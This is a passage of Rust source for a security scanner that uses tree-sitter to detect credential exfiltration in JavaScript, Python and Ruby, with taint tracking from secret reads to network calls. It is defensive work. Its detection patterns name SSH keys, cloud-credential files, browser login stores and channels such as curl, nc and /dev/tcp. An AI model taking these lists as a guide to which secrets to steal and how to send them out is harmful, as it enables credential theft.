//! Tree-sitter-backed structural analysis for JavaScript / TypeScript,
//! Python, and Ruby — the two things the regex layer in `lib.rs`
//! structurally can't do:
//!
//!  1. **Source-to-sink taint** (`trace_exfiltration`). A value read from
//!     secret material (an SSH key, `~/.aws/credentials`, `process.env`,
//!     `os.environ`, `ENV[…]`) that then reaches a network sink (`fetch` /
//!     `requests.post` / `Net::HTTP.post` body, a socket write, a
//!     `curl`/`wget`/`nc` argument, a DNS lookup, a staged buffer that is
//!     later sent) is the canonical exfiltration flow. Regex can see both
//!     ends appear in a file; it can't tell whether the secret actually
//!     flows to the wire. This does, with a small **function-scoped**
//!     def-use pass over the AST: a variable is tainted within the scope
//!     it is assigned in and every nested scope (closures capture), but
//!     not in a sibling function.
//!
//!  2. **Structural capability confirmation** (`ast_capabilities`).
//!     `readFileSync(path.join(home, ".ssh", "id_rsa"))` splits the
//!     sensitive path across three string arguments — the regex
//!     `\.ssh[/\\]id_rsa` never matches it. A call to `child_process.exec`
//!     with a string that pipes a secret into `curl` is a shell string,
//!     not prose. Tree-sitter also never reports a match inside a comment,
//!     which kills a whole class of false positive.
//!
//! `.ts` / `.tsx` are parsed with the JavaScript grammar (see this
//! crate's Cargo.toml). TypeScript type annotations produce a few ERROR
//! nodes; the call / member / assignment expressions this analysis walks
//! still parse correctly, and tree-sitter is error-tolerant by design.
//! Perl stays regex-only (`PERL_RULES` in `lib.rs`) — its grammar and
//! dynamic dispatch make AST taint low-value.
//!
//! This layer is **additive** — it runs alongside the regex rules and its
//! findings are de-duplicated against them. The regex rules are tuned
//! against a real benign corpus; nothing here removes that safety net.

use talyx_core::{Capability, CapabilityFinding, EvidenceBasis};
use std::collections::HashSet;
use std::path::Path;
use tree_sitter::{Node, Parser, Tree};

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum AstLang {
    JavaScript,
    Python,
    Ruby,
}

pub fn lang_for_ext(ext: &str) -> Option<AstLang> {
    match ext {
        "js" | "mjs" | "cjs" | "jsx" | "ts" | "tsx" => Some(AstLang::JavaScript),
        "py" | "pyw" => Some(AstLang::Python),
        "rb" => Some(AstLang::Ruby),
        _ => None,
    }
}

/// Full AST pass: structural capabilities + any traced exfiltration flow.
pub fn analyze(source: &str, lang: AstLang, path: &Path) -> Vec<CapabilityFinding> {
    let Some(tree) = parse(source, lang) else {
        return Vec::new();
    };
    let src = source.as_bytes();
    let root = tree.root_node();

    let mut findings = ast_capabilities(root, src, lang, path);
    findings.extend(trace_exfiltration(root, src, lang, path));

    // De-dup within this pass by (capability, evidence).
    let mut seen = HashSet::new();
    findings.retain(|f| seen.insert((f.capability, f.evidence.clone())));
    findings
}

fn parse(source: &str, lang: AstLang) -> Option<Tree> {
    // Bound the work: tree-sitter is linear, but a pathological minified
    // blob still isn't worth parsing for this.
    if source.len() > 1_500_000 {
        return None;
    }
    let mut parser = Parser::new();
    let language = match lang {
        AstLang::JavaScript => tree_sitter_javascript::LANGUAGE.into(),
        AstLang::Python => tree_sitter_python::LANGUAGE.into(),
        AstLang::Ruby => tree_sitter_ruby::LANGUAGE.into(),
    };
    parser.set_language(&language).ok()?;
    parser.parse(source, None)
}

// ─────────────────────────────────────────────────────────────────────
// node helpers
// ─────────────────────────────────────────────────────────────────────

fn text<'a>(node: Node, src: &'a [u8]) -> &'a str {
    node.utf8_text(src).unwrap_or("")
}

fn line_of(node: Node) -> usize {
    node.start_position().row + 1
}

fn walk<'a>(node: Node<'a>, f: &mut dyn FnMut(Node<'a>)) {
    f(node);
    let mut c = node.walk();
    for child in node.children(&mut c) {
        walk(child, f);
    }
}

/// Every "this is a function/method call" node kind across the three
/// grammars — JS `call_expression`, Python/Ruby `call`, and Ruby's
/// no-parenthesis `command` / `command_call`.
fn is_call(kind: &str) -> bool {
    matches!(kind, "call_expression" | "call" | "command" | "command_call")
}

/// The dotted callee of a call node, e.g. `fs.readFileSync`,
/// `child_process.execSync`, `axios.post`, `os.path.join`. Returns the
/// last identifier for a bare call (`fetch`, `require`, `open`).
fn callee_path(call: Node, src: &[u8], lang: AstLang) -> Option<String> {
    match lang {
        AstLang::JavaScript | AstLang::Python => {
            member_path(call.child_by_field_name("function")?, src)
        }
        AstLang::Ruby => {
            // Ruby `call` / `command` / `command_call`: a `method` field
            // plus an optional `receiver`.
            let method = call
                .child_by_field_name("method")
                .map(|m| text(m, src).to_string())?;
            match call.child_by_field_name("receiver") {
                Some(recv) => {
                    let r = member_path(recv, src)
                        .unwrap_or_else(|| text(recv, src).to_string());
                    Some(format!("{r}.{method}"))
                }
                None => Some(method),
            }
        }
    }
}

/// Renders `a.b.c` (JS `member_expression`, Py `attribute`, Ruby
/// `scope_resolution` like `Net::HTTP`) or a bare identifier / constant to
/// a dotted string. Anything else → None.
fn member_path(node: Node, src: &[u8]) -> Option<String> {
    match node.kind() {
        "identifier" | "property_identifier" | "constant" => Some(text(node, src).to_string()),
        "member_expression" | "attribute" => {
            let prop = node
                .child_by_field_name("property")
                .or_else(|| node.child_by_field_name("attribute"))
                .map(|p| text(p, src).to_string())?;
            // `require('fs').readFileSync(...)` — the object is a call, not
            // a resolvable dotted path. Try to unwrap `require('X')` to
            // `X.prop`; otherwise fall back to just the property so
            // callee-name checks (`is_file_read` / `is_file_write` / …)
            // still work.
            let obj = node.child_by_field_name("object").and_then(|o| {
                member_path(o, src).or_else(|| require_target(o, src))
            });
            Some(match obj {
                Some(o) => format!("{o}.{prop}"),
                None => prop,
            })
        }
        "scope_resolution" => {
            let name = node
                .child_by_field_name("name")
                .map(|n| text(n, src).to_string())?;
            match node.child_by_field_name("scope").and_then(|s| member_path(s, src)) {
                Some(s) => Some(format!("{s}::{name}")),
                None => Some(name),
            }
        }
        // Ruby `Foo.bar` with no arguments parses as a `call` node.
        "call" => {
            let method = node.child_by_field_name("method").map(|m| text(m, src).to_string())?;
            match node.child_by_field_name("receiver").and_then(|r| member_path(r, src)) {
                Some(r) => Some(format!("{r}.{method}")),
                None => Some(method),
            }
        }
        _ => None,
    }
}

/// `require('fs')` → `"fs"`, so `require('fs').readFileSync` resolves to
/// `fs.readFileSync`.
fn require_target(node: Node, src: &[u8]) -> Option<String> {
    if !is_call(node.kind()) {
        return None;
    }
    let func = node.child_by_field_name("function")?;
    if text(func, src) != "require" {
        return None;
    }
    node.child_by_field_name("arguments")
        .and_then(|a| a.named_child(0))
        .and_then(|s| string_value(s, src))
        .map(|m| m.strip_prefix("node:").unwrap_or(&m).to_string())
}

/// String literal text with surrounding quotes stripped, for `string`
/// (JS + Py) and JS `template_string` (only the literal chunks).
fn string_value(node: Node, src: &[u8]) -> Option<String> {
    match node.kind() {
        "string" => {
            let raw = text(node, src);
            Some(strip_quotes(raw))
        }
        "template_string" => Some(
            text(node, src)
                .trim_matches('`')
                .split("${")
                .map(|seg| seg.splitn(2, '}').last().unwrap_or(seg))
                .collect::<String>(),
        ),
        "string_fragment" | "string_content" => Some(text(node, src).to_string()),
        _ => None,
    }
}

fn strip_quotes(s: &str) -> String {
    let t = s.trim();
    t.strip_prefix('"')
        .or_else(|| t.strip_prefix('\''))
        .and_then(|x| x.strip_suffix('"').or_else(|| x.strip_suffix('\'')))
        .unwrap_or(t)
        .to_string()
}

/// Collects every string literal anywhere under `node` (used to inspect a
/// call's whole argument subtree — covers `path.join(home, ".ssh", key)`,
/// concatenations, template literals).
fn descendant_strings(node: Node, src: &[u8]) -> Vec<String> {
    let mut out = Vec::new();
    walk(node, &mut |n| {
        if let Some(s) = string_value(n, src) {
            if !s.is_empty() {
                out.push(s);
            }
        }
    });
    out
}

/// Every identifier name referenced anywhere under `node`. Includes JS
/// object-shorthand identifiers (`{ key }` — the `key` node is a
/// `shorthand_property_identifier`, not a plain `identifier`), which is
/// exactly how a tainted value is usually threaded into a `fetch` body.
fn descendant_identifiers(node: Node, src: &[u8]) -> HashSet<String> {
    let mut out = HashSet::new();
    walk(node, &mut |n| {
        if matches!(
            n.kind(),
            "identifier"
                | "shorthand_property_identifier"
                | "shorthand_property_identifier_pattern"
        ) {
            out.insert(text(n, src).to_string());
        }
    });
    out
}

// ─────────────────────────────────────────────────────────────────────
// sensitive-path / secret classification
// ─────────────────────────────────────────────────────────────────────

/// Does this string (or joined path segment set) name raw secret
/// material? Returns the capability + a short label.
fn secret_path_capability(s: &str) -> Option<(Capability, &'static str)> {
    let l = s.to_ascii_lowercase();
    if l.contains(".ssh") && (l.contains("id_rsa") || l.contains("id_ed25519") || l.contains("id_ecdsa") || l.contains("id_dsa"))
        || l.ends_with("/.ssh")
        || l == ".ssh"
        || l.contains(".ssh/id_")
    {
        return Some((Capability::ReadSsh, "an SSH private key path"));
    }
    // Tier 1: an unambiguous raw-secret FILE — its whole content is
    // credential material. `ReadCredentials` counts as raw secret
    // material, so a read + network is the uncapped +40 exfiltration
    // pattern.
    if l.contains(".aws/credentials")
        || l.contains(".aws\\credentials")
        || l.ends_with(".netrc")
        || l.contains("/.netrc")
        || l.ends_with(".pypirc")
        || l.contains("gcloud/credentials.db")
        || l.contains("application_default_credentials.json")
    {
        return Some((Capability::ReadCredentials, "a stored-credential file path"));
    }
    // Tier 2: a path that *may* hold a secret but often holds only
    // settings (`.aws/config` is region/profile data; `.npmrc` /
    // `.docker/config.json` / `.kube/config` sometimes carry a token,
    // sometimes not). `CloudCredentials` — capped in the risk engine, so
    // this doesn't auto-escalate a benign config-reading tool. Matches
    // the regex layer's original mapping.
    if l.contains(".aws/config")
        || l.contains(".aws\\config")
        || l.contains(".config/gcloud")
        || l.contains(".azure/")
        || l.contains(".azure\\")
        || l.contains(".docker/config.json")
        || l.contains(".kube/config")
        || l.ends_with(".npmrc")
        || l.contains("/.npmrc")
    {
        return Some((Capability::CloudCredentials, "a cloud-config / credential path"));
    }
    if l.contains("login data")
        || l.contains("cookies.sqlite")
        || (l.contains("chrome") && l.contains("user data"))
        || (l.contains("firefox") && (l.contains("logins.json") || l.contains("key4.db")))
        || l.contains("/library/keychains/")
    {
        return Some((Capability::ReadBrowserData, "a browser / keychain credential store path"));
    }
    None
}

/// Like `secret_path_capability` but for a *bare* string literal (not an
/// argument to a proven file-read call). A tier-1 raw-credential file is
/// downgraded to the capped `CloudCredentials` — a mention of `.netrc` in
/// a security tool's own code is not a proven read of it, and shouldn't
/// escalate the tool to CRITICAL via the raw-secret + network rule. A
/// read call (`readFileSync(".netrc")`) still gets the full tier through
/// `secret_path_capability` directly. Keeps parity with the regex layer,
/// which has no `.netrc` rule and maps `.aws/credentials` to
/// `CloudCredentials`.
fn secret_path_capability_bare(s: &str) -> Option<(Capability, &'static str)> {
    match secret_path_capability(s) {
        Some((Capability::ReadCredentials, _)) => {
            Some((Capability::CloudCredentials, "a stored-credential file path"))
        }
        other => other,
    }
}

/// Set of segment strings that, joined, form a sensitive path even though
/// no single literal matches (`path.join(home, ".ssh", "id_rsa")`).
fn joined_segments_are_secret(segs: &[String]) -> Option<(Capability, &'static str)> {
    let joined = segs.join("/").to_ascii_lowercase();
    secret_path_capability(&joined)
}

/// A cloud-credential *environment-variable name* — unambiguous whether
/// it appears as a bare literal or a `process.env.<NAME>` access.
fn credential_env_name(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    l.contains("aws_secret_access_key")
        || l.contains("aws_session_token")
        || l.contains("google_application_credentials")
        || l.contains("azure_client_secret")
        || l.contains("gcp_service_account")
}

/// Does this string contain a runtime package-install command? Checked
/// only inside a shell-exec argument (a proven runtime install), not on a
/// bare literal — "pip install …" in a security tool's help text is not
/// evidence the tool installs anything.
fn is_install_command(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    l.contains("npm install")
        || l.contains("npm i ")
        || l.contains("yarn add")
        || l.contains("pnpm add")
        || l.contains("pip install")
        || l.contains("pip3 install")
        || l.contains("gem install")
        || l.contains("apt install")
        || l.contains("apt-get install")
        || l.contains("brew install")
        || l.contains("cargo install")
        || l.contains("curl ") && l.contains("| sh")
}

/// A shell-profile path — checked only as an argument to a file-write
/// call, not on a bare literal.
fn is_shell_profile_path(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    l.ends_with(".bashrc")
        || l.ends_with(".zshrc")
        || l.ends_with(".bash_profile")
        || l.ends_with(".zprofile")
        || l.ends_with(".profile")
        || l.contains("/.bashrc")
        || l.contains("/.zshrc")
        || l.contains("/.bash_profile")
        || l.contains("\\.bashrc")
}

fn is_cron_spec(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    l.contains("crontab -") || l.contains("* * * * *")
}

fn is_file_write(callee: &str) -> bool {
    let last = callee.rsplit('.').next().unwrap_or(callee);
    matches!(
        last,
        "writeFileSync" | "writeFile" | "appendFileSync" | "appendFile" | "createWriteStream"
    )
}

/// A bash network redirect / tool an exec'd command string uses to reach
/// the wire — extends `is_network_tool` with the `/dev/tcp` trick.
fn command_string_exfil_channel(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    is_network_tool(s) || l.contains("/dev/tcp/") || l.contains("/dev/udp/")
}

// ─────────────────────────────────────────────────────────────────────
// structural capability detection
// ─────────────────────────────────────────────────────────────────────

fn finding(cap: Capability, evidence: &str, path: &Path, line: usize) -> CapabilityFinding {
    CapabilityFinding {
        capability: cap,
        basis: EvidenceBasis::Inferred,
        evidence: format!("AST: {evidence}"),
        location: Some(format!("{}:{}", path.display(), line)),
    }
}

fn ast_capabilities(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<CapabilityFinding> {
    let mut out = Vec::new();

    walk(root, &mut |node| {
        match node.kind() {
            // ── imports ────────────────────────────────────────────
            "import_statement" | "import_from_statement" | "call_expression" | "call" | "command" | "command_call" => {
                if let Some(module) = imported_module(node, src, lang) {
                    if let Some((cap, label)) = module_capability(&module, lang) {
                        out.push(finding(cap, label, path, line_of(node)));
                    }
                }
            }
            _ => {}
        }

        // ── call expressions: callee + arguments ──────────────────
        if is_call(node.kind()) {
            if let Some(callee) = callee_path(node, src, lang) {
                if let Some((cap, label)) = callee_capability(&callee, lang) {
                    out.push(finding(cap, label, path, line_of(node)));
                }

                // A file-read whose path argument (possibly split across
                // path.join segments) names secret material.
                if is_file_read(&callee, lang) {
                    if let Some(args) = node.child_by_field_name("arguments") {
                        let segs = descendant_strings(args, src);
                        let hit = segs
                            .iter()
                            .find_map(|s| secret_path_capability(s))
                            .or_else(|| joined_segments_are_secret(&segs));
                        if let Some((cap, label)) = hit {
                            out.push(finding(
                                cap,
                                &format!("{callee}(...) reads {label}"),
                                path,
                                line_of(node),
                            ));
                        }
                    }
                }

                // What an exec'd command string actually does.
                if is_shell_exec(&callee, lang) {
                    if let Some(args) = node.child_by_field_name("arguments") {
                        for s in descendant_strings(args, src) {
                            if looks_like_exfil_command(&s) {
                                out.push(finding(
                                    Capability::ExecuteShell,
                                    &format!("{callee}(...) runs a command that pipes local data to the network (curl/wget/nc//dev/tcp)"),
                                    path,
                                    line_of(node),
                                ));
                            }
                            if is_install_command(&s) {
                                out.push(finding(
                                    Capability::InstallPackage,
                                    &format!("{callee}(...) runs a package-install command"),
                                    path,
                                    line_of(node),
                                ));
                            }
                            if is_cron_spec(&s) {
                                out.push(finding(
                                    Capability::Cron,
                                    &format!("{callee}(...) installs a cron job"),
                                    path,
                                    line_of(node),
                                ));
                            }
                        }
                    }
                }

                // A file WRITE targeting a shell profile — JS
                // `appendFileSync(".bashrc", …)` or Python
                // `open(".bashrc", "a")`.
                let last = callee.rsplit('.').next().unwrap_or(&callee);
                let is_write_call = is_file_write(&callee)
                    || matches!(last, "write_text" | "write_bytes")
                    || (lang == AstLang::Python && last == "open");
                if is_write_call {
                    if let Some(args) = node.child_by_field_name("arguments") {
                        let segs = descendant_strings(args, src);
                        let names_profile = segs.iter().any(|s| is_shell_profile_path(s))
                            || is_shell_profile_path(&segs.join("/"));
                        // for `open`, require a write mode ('w'/'a'/'x')
                        let is_write = last != "open"
                            || segs.iter().any(|s| {
                                let m = s.to_ascii_lowercase();
                                m.len() <= 4 && (m.contains('w') || m.contains('a') || m.contains('x'))
                            });
                        if names_profile && is_write {
                            out.push(finding(
                                Capability::ShellProfile,
                                &format!("{callee}(...) writes to a shell profile"),
                                path,
                                line_of(node),
                            ));
                        }
                    }
                }
            }
        }

        // ── `new Function(...)` / `new WebSocket(...)` ─────────────
        if node.kind() == "new_expression" {
            if let Some(ctor) = node.child_by_field_name("constructor").and_then(|c| member_path(c, src)) {
                match ctor.as_str() {
                    "Function" => out.push(finding(
                        Capability::ExecuteShell,
                        "new Function(...) — dynamic code execution",
                        path,
                        line_of(node),
                    )),
                    "WebSocket" | "EventSource" => out.push(finding(
                        Capability::NetworkExternal,
                        "opens a WebSocket / SSE connection",
                        path,
                        line_of(node),
                    )),
                    _ => {}
                }
            }
        }

        // ── process.env / os.environ member access ────────────────
        if let Some(p) = member_path(node, src) {
            let pl = p.as_str();
            if pl == "process.env"
                || pl.starts_with("process.env.")
                || pl == "os.environ"
                || pl.starts_with("os.environ.")
                || pl == "ENV.fetch"
            {
                out.push(finding(
                    Capability::EnvironmentVariables,
                    "reads environment variables",
                    path,
                    line_of(node),
                ));
                if credential_env_name(pl) {
                    out.push(finding(
                        Capability::CloudCredentials,
                        "reads a cloud-credential environment variable",
                        path,
                        line_of(node),
                    ));
                }
            }
        }
        // Ruby `ENV['X']` → `element_reference` with object `ENV`.
        if node.kind() == "element_reference" {
            if let Some(obj) = node.child_by_field_name("object") {
                if text(obj, src) == "ENV" {
                    out.push(finding(
                        Capability::EnvironmentVariables,
                        "reads environment variables (ENV[…])",
                        path,
                        line_of(node),
                    ));
                }
            }
        }

        // ── bare string literals that name secret material ────────
        // Only when they're an argument or an assignment RHS (an AST
        // string is never inside a comment, so this is already far
        // tighter than the regex).
        if node.kind() == "string" && in_expression_position(node) {
            if let Some(s) = string_value(node, src) {
                if let Some((cap, label)) = secret_path_capability_bare(&s) {
                    out.push(finding(
                        cap,
                        &format!("string literal names {label}"),
                        path,
                        line_of(node),
                    ));
                }
                if credential_env_name(&s) {
                    out.push(finding(
                        Capability::CloudCredentials,
                        "string literal is a cloud-credential environment variable name",
                        path,
                        line_of(node),
                    ));
                }
            }
        }
    });

    out
}

/// True if the string node is used as a value (call arg, assignment RHS,
/// array/object element) rather than, say, a bare expression statement or
/// a decorator — a cheap guard against a stray docstring-ish literal.
fn in_expression_position(node: Node) -> bool {
    let Some(parent) = node.parent() else {
        return false;
    };
    matches!(
        parent.kind(),
        "arguments"
            | "argument_list"
            | "variable_declarator"
            | "assignment"
            | "assignment_expression"
            | "augmented_assignment"
            | "array"
            | "list"
            | "pair"
            | "binary_expression"
            | "binary_operator"
            | "template_substitution"
            | "keyword_argument"
    )
}

fn imported_module(node: Node, src: &[u8], lang: AstLang) -> Option<String> {
    match (node.kind(), lang) {
        ("import_statement", AstLang::JavaScript) => node
            .child_by_field_name("source")
            .and_then(|s| string_value(s, src)),
        ("import_statement" | "import_from_statement", AstLang::Python) => {
            // `import subprocess`, `from urllib import request`
            let mut c = node.walk();
            let found = node
                .children(&mut c)
                .find(|ch| ch.kind() == "dotted_name" || ch.kind() == "module_name")
                .map(|ch| text(ch, src).to_string());
            found.or_else(|| {
                node.child_by_field_name("module_name")
                    .map(|m| text(m, src).to_string())
            })
        }
        ("call_expression" | "call", AstLang::JavaScript) => {
            // require('child_process')
            if callee_path(node, src, lang).as_deref() == Some("require") {
                node.child_by_field_name("arguments")
                    .and_then(|a| a.named_child(0))
                    .and_then(|s| string_value(s, src))
            } else {
                None
            }
        }
        _ => None,
    }
}

fn module_capability(module: &str, lang: AstLang) -> Option<(Capability, &'static str)> {
    let m = module.strip_prefix("node:").unwrap_or(module);
    let base = m.split(['/', '.']).next().unwrap_or(m);
    match lang {
        AstLang::JavaScript => match base {
            "child_process" => Some((Capability::ExecuteShell, "imports child_process")),
            "fs" => Some((Capability::ReadWorkspace, "imports fs")),
            "https" | "http" | "http2" | "net" | "tls" | "dgram" | "dns" => {
                Some((Capability::NetworkExternal, "imports a network module"))
            }
            "os" => None,
            _ => match m {
                "axios" | "node-fetch" | "undici" | "got" | "request" | "superagent" => {
                    Some((Capability::NetworkExternal, "imports an HTTP client"))
                }
                "node-cron" | "cron" | "node-schedule" | "toad-scheduler" => {
                    Some((Capability::Cron, "imports a job scheduler"))
                }
                _ => None,
            },
        },
        AstLang::Python => match base {
            "subprocess" => Some((Capability::ExecuteShell, "imports subprocess")),
            "socket" | "requests" | "urllib" | "aiohttp" | "httpx" | "http" => {
                Some((Capability::NetworkExternal, "imports a network module"))
            }
            "boto3" | "botocore" => {
                Some((Capability::CloudCredentials, "imports the AWS SDK (boto3)"))
            }
            "schedule" | "apscheduler" | "crontab" => {
                Some((Capability::Cron, "imports a job scheduler"))
            }
            _ => None,
        },
        AstLang::Ruby => match m {
            "open3" | "shell" => Some((Capability::ExecuteShell, "requires open3/shell")),
            "net/http" | "net/https" | "socket" | "open-uri" | "httparty" | "faraday"
            | "rest-client" | "excon" | "typhoeus" => {
                Some((Capability::NetworkExternal, "requires a network library"))
            }
            _ => None,
        },
    }
}

fn callee_capability(callee: &str, lang: AstLang) -> Option<(Capability, &'static str)> {
    let last = callee.rsplit('.').next().unwrap_or(callee);
    match lang {
        AstLang::JavaScript => match last {
            "execSync" | "exec" | "spawnSync" | "spawn" | "fork" | "execFile" | "execFileSync" => {
                Some((Capability::SpawnProcess, "calls child_process exec/spawn"))
            }
            "eval" => Some((Capability::ExecuteShell, "calls eval() (dynamic code execution)")),
            "fetch" => Some((Capability::NetworkExternal, "calls fetch()")),
            _ => {
                if callee.ends_with(".request") || callee.ends_with(".get") && callee.contains("http")
                {
                    Some((Capability::NetworkExternal, "makes an HTTP request"))
                } else {
                    None
                }
            }
        },
        AstLang::Python => match last {
            "system" | "popen" => Some((Capability::ExecuteShell, "calls os.system/os.popen")),
            "run" | "call" | "check_output" | "check_call" | "Popen"
                if callee.starts_with("subprocess") =>
            {
                Some((Capability::SpawnProcess, "calls subprocess"))
            }
            "urlopen" => Some((Capability::NetworkExternal, "calls urllib urlopen")),
            _ => {
                if callee.starts_with("requests.") || callee.starts_with("httpx.") {
                    Some((Capability::NetworkExternal, "makes an HTTP request"))
                } else {
                    None
                }
            }
        },
        AstLang::Ruby => match last {
            "system" | "exec" | "spawn" => {
                Some((Capability::ExecuteShell, "calls Kernel#system/exec/spawn"))
            }
            "popen" | "popen2" | "popen3" | "capture2" | "capture3" => {
                Some((Capability::SpawnProcess, "spawns a subprocess (IO.popen/Open3)"))
            }
            _ => {
                if callee.starts_with("Net::HTTP")
                    || callee.starts_with("HTTParty")
                    || callee.starts_with("RestClient")
                    || callee.starts_with("Faraday")
                {
                    Some((Capability::NetworkExternal, "makes an HTTP request"))
                } else {
                    None
                }
            }
        },
    }
}

fn is_file_read(callee: &str, lang: AstLang) -> bool {
    let last = callee.rsplit('.').next().unwrap_or(callee);
    match lang {
        AstLang::JavaScript => matches!(
            last,
            "readFileSync" | "readFile" | "createReadStream" | "open" | "openSync"
        ),
        AstLang::Python => matches!(last, "open" | "read_text" | "read_bytes" | "read"),
        AstLang::Ruby => {
            matches!(last, "read" | "readlines" | "binread" | "foreach")
                || callee == "File.open"
                || callee == "IO.open"
        }
    }
}

fn is_shell_exec(callee: &str, lang: AstLang) -> bool {
    let last = callee.rsplit('.').next().unwrap_or(callee);
    match lang {
        AstLang::JavaScript => matches!(
            last,
            "exec" | "execSync" | "spawn" | "spawnSync" | "execFile" | "execFileSync"
        ),
        AstLang::Python => {
            matches!(last, "system" | "popen")
                || (callee.starts_with("subprocess")
                    && matches!(last, "run" | "call" | "check_output" | "check_call" | "Popen"))
        }
        AstLang::Ruby => {
            matches!(last, "system" | "exec" | "spawn" | "popen" | "sh")
                || callee.starts_with("Open3.")
                || callee == "IO.popen"
        }
    }
}

fn looks_like_exfil_command(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    let transmit = l.contains("curl ")
        || l.contains("wget ")
        || l.contains("| nc ")
        || l.contains("|nc ")
        || l.contains("scp ")
        || l.contains("xxd")
        || l.contains("base64")
        || l.contains("/dev/tcp/")
        || l.contains("/dev/udp/");
    let secret = l.contains(".ssh")
        || l.contains("id_rsa")
        || l.contains(".aws")
        || l.contains(".env")
        || l.contains("credentials")
        || l.contains("/etc/passwd");
    let pipe_or_data = l.contains('|')
        || l.contains('>')
        || l.contains("--data")
        || l.contains("-d ")
        || l.contains("-F ")
        || l.contains('@');
    transmit && secret && pipe_or_data
}

// ─────────────────────────────────────────────────────────────────────
// source-to-sink taint
// ─────────────────────────────────────────────────────────────────────

type TaintMap = std::collections::HashMap<String, (Capability, &'static str)>;

/// A small def-use taint pass, **scoped by function** and with a shallow
/// interprocedural step. A variable assigned in a scope is visible in
/// that scope and every nested one (closures capture outer bindings), but
/// NOT in a sibling function — so `function a(){ k = readKey() }` no
/// longer taints `function b(){ post(k) }` unless `k` is genuinely
/// module-level. Before the main pass, every function is checked for
/// "does it `return` tainted data"; a call to such a function is then
/// itself treated as a taint source (the common `const x = grab()`
/// helper pattern). One level of summary, iterated to a fixed point; no
/// recursion unrolling, no shadowing.
fn trace_exfiltration(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<CapabilityFinding> {
    let returns = function_return_taints(root, src, lang);
    let param_sinks = function_param_sinks(root, src, lang, &returns);
    let mut out = Vec::new();
    let mut reported: HashSet<(Capability, usize)> = HashSet::new();
    let empty = TaintMap::new();
    analyze_scope(
        root, src, lang, path, &empty, &returns, &param_sinks, &mut out, &mut reported,
    );
    out
}

/// A function whose body passes one of its parameters to a network sink
/// — calling it with a tainted argument is an exfiltration flow
/// (`function upload(d){ fetch(url,{body:d}) } … upload(sshKey)`).
/// name → the set of parameter *names* that reach a sink.
type ParamSinks = std::collections::HashMap<String, HashSet<String>>;

fn function_param_sinks(root: Node, src: &[u8], lang: AstLang, returns: &TaintMap) -> ParamSinks {
    let mut scopes = Vec::new();
    collect_all_scopes(root, &mut scopes);
    let mut out: ParamSinks = ParamSinks::new();
    for &scope in &scopes {
        let Some(fname) = function_name(scope, src, lang) else {
            continue;
        };
        let params = param_names(scope, src, lang);
        if params.is_empty() {
            continue;
        }
        let mut sinking: HashSet<String> = HashSet::new();
        for p in &params {
            // Seed ONLY this parameter as tainted, then see whether it
            // (or anything derived from it) reaches a sink in the body.
            let mut seed = TaintMap::new();
            seed.insert(p.clone(), (Capability::EnvironmentVariables, "a caller-supplied value"));
            let tainted = compute_scope_taint(scope, src, lang, &seed, returns);
            let mut reaches = false;
            for_each_direct(scope, &mut |node| {
                if reaches || !is_call(node.kind()) {
                    return;
                }
                let Some(callee) = callee_path(node, src, lang) else {
                    return;
                };
                if callee.starts_with("console.")
                    || callee.starts_with("process.stdout")
                    || callee.starts_with("process.stderr")
                    || callee == "print"
                {
                    return;
                }
                let Some(args) = node.child_by_field_name("arguments") else {
                    return;
                };
                let is_sink = is_network_sink(&callee, lang)
                    || (is_shell_exec(&callee, lang)
                        && descendant_strings(args, src)
                            .iter()
                            .any(|s| command_string_exfil_channel(s)));
                if !is_sink {
                    return;
                }
                if descendant_identifiers(args, src)
                    .iter()
                    .any(|id| tainted.contains_key(id))
                {
                    reaches = true;
                }
            });
            if reaches {
                sinking.insert(p.clone());
            }
        }
        if !sinking.is_empty() {
            out.insert(fname, sinking);
        }
    }
    out
}

/// Ordered parameter names of a function scope.
fn param_names(scope: Node, src: &[u8], _lang: AstLang) -> Vec<String> {
    let params = scope
        .child_by_field_name("parameters")
        .or_else(|| scope.child_by_field_name("parameter")) // JS single-arg arrow
        .or_else(|| scope.child_by_field_name("method_parameters"));
    let Some(params) = params else {
        return Vec::new();
    };
    if params.kind() == "identifier" {
        return vec![text(params, src).to_string()];
    }
    let mut out = Vec::new();
    let mut cursor = params.walk();
    for child in params.children(&mut cursor) {
        match child.kind() {
            "identifier" => out.push(text(child, src).to_string()),
            "required_parameter" | "optional_parameter" | "typed_parameter"
            | "default_parameter" | "typed_default_parameter" | "splat_parameter"
            | "keyword_parameter" | "optional_parameter_pattern" => {
                let name = child
                    .child_by_field_name("pattern")
                    .or_else(|| child.child_by_field_name("name"))
                    .or_else(|| {
                        let mut c = child.walk();
                        let found = child.children(&mut c).find(|n| n.kind() == "identifier");
                        found
                    });
                if let Some(n) = name {
                    if n.kind() == "identifier" {
                        out.push(text(n, src).to_string());
                    }
                }
            }
            _ => {}
        }
    }
    out
}

/// name → the taint a function returns. Fixed-point: a function that
/// returns the result of another tainted-returning function counts too.
fn function_return_taints(root: Node, src: &[u8], lang: AstLang) -> TaintMap {
    let mut scopes = Vec::new();
    collect_all_scopes(root, &mut scopes);
    let mut returns = TaintMap::new();
    for _ in 0..4 {
        let mut changed = false;
        for &scope in &scopes {
            let Some(name) = function_name(scope, src, lang) else {
                continue;
            };
            if returns.contains_key(&name) {
                continue;
            }
            if let Some(sec) = scope_returns_taint(scope, src, lang, &returns) {
                returns.insert(name, sec);
                changed = true;
            }
        }
        if !changed {
            break;
        }
    }
    returns
}

fn collect_all_scopes<'a>(node: Node<'a>, out: &mut Vec<Node<'a>>) {
    if is_scope_node(node.kind()) {
        out.push(node);
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        collect_all_scopes(child, out);
    }
}

/// The declared name of a function scope — a `function_declaration` /
/// `method_definition` / Python `function_definition` / Ruby `method`
/// name, or the identifier a `const f = () => …` arrow is bound to.
fn function_name(scope: Node, src: &[u8], lang: AstLang) -> Option<String> {
    if let Some(n) = scope.child_by_field_name("name") {
        return Some(text(n, src).to_string());
    }
    // Anonymous function/arrow bound to a variable or an object property.
    let parent = scope.parent()?;
    match (parent.kind(), lang) {
        ("variable_declarator", AstLang::JavaScript) => {
            parent.child_by_field_name("name").map(|n| text(n, src).to_string())
        }
